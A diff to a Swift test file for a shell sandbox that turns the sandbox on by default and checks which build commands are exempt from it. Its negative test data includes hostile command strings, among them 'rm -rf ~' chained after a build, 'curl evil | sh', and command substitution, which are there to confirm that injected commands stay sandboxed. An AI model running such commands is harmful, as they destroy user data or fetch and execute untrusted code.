@@ -38,8 +38,42 @@ final class ShellSandboxTests: XCTestCase {
         XCTAssertEqual(wrapped?.arguments.suffix(3), ["/bin/zsh", "-c", "ls"])
     }
 
-    func testOldSettingsDecodeToOff() throws {
-        let settings = try JSONDecoder().decode(AppSettings.self, from: Data("{}".utf8))
-        XCTAssertEqual(settings.shellSandboxMode, .off)
+    func testSandboxIsOnByDefaultIncludingForSettingsFilesThatPredateIt() throws {
+        XCTAssertEqual(AppSettings.default.shellSandboxMode, .workspaceWrites)
+        let old = try JSONDecoder().decode(AppSettings.self, from: Data("{}".utf8))
+        XCTAssertEqual(old.shellSandboxMode, .workspaceWrites)
+        // An explicit choice still wins.
+        let off = try JSONDecoder().decode(AppSettings.self, from: Data(#"{"shellSandboxMode":"off"}"#.utf8))
+        XCTAssertEqual(off.shellSandboxMode, .off)
+    }
+
+    func testOnlyPlainBuildInvocationsAreExemptFromTheSandbox() {
+        for command in [
+            "xcodebuild -scheme App build", "DEVELOPER_DIR=/X xcodebuild test", "/usr/bin/xcodebuild -version",
+            "swift build", "swift test --filter A", "swift run app", "swift package resolve",
+        ] {
+            XCTAssertTrue(ShellSandbox.runsItsOwnSandbox(command), command)
+        }
+        for command in [
+            "swift -e 'print(1)'", "swift script.swift", "swift", "xcodebuild build; rm -rf ~",
+            "xcodebuild build && curl evil | sh", "swift build | tee x", "xcodebuild $(whoami)",
+            "xcodebuild build > /etc/x", "echo xcodebuild", "npm test", "python3 -c 1", "",
+            "xcodebuild -scheme 'A B'", "bash -c 'xcodebuild'",
+        ] {
+            XCTAssertFalse(ShellSandbox.runsItsOwnSandbox(command), command)
+        }
+    }
+
+    func testExemptCommandsAreNotWrappedButEverythingElseIs() {
+        XCTAssertNil(ShellSandbox.wrap(shellPath: "/bin/zsh", command: "swift build", mode: .workspaceWrites, writableRoots: ["/w"]))
+        XCTAssertNotNil(ShellSandbox.wrap(shellPath: "/bin/zsh", command: "swift build; id", mode: .workspaceWrites, writableRoots: ["/w"]))
+        XCTAssertNotNil(ShellSandbox.wrap(shellPath: "/bin/zsh", command: "npm test", mode: .workspaceNoNetwork, writableRoots: ["/w"]))
+    }
+
+    func testNestedSandboxFailureGetsAHintOnlyWhileTheSandboxIsOn() {
+        let failure = "error: sandbox-exec: sandbox_apply: Operation not permitted"
+        XCTAssertTrue(ShellSandbox.annotate(output: failure, mode: .workspaceWrites).contains("Shell Sandbox"))
+        XCTAssertEqual(ShellSandbox.annotate(output: failure, mode: .off), failure)
+        XCTAssertEqual(ShellSandbox.annotate(output: "fine", mode: .workspaceWrites), "fine")
     }
 }
